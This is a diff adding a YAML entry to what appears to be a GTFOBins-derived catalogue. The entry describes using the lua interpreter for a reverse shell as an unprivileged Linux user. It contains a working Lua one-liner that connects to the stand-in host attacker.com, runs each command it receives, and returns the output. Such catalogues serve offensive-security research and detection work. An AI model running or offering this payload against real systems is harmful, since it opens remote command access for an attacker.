@@ -1,0 +1,27 @@
+id: gtfobins/lua/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: lua
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\"\
+    ,12345);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local\
+    \ b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
+  comment: This requires `lua-socket` to be available.
+references:
+- https://gtfobins.github.io/gtfobins/lua/
+tags:
+- linux
+- unix
+- gtfobins
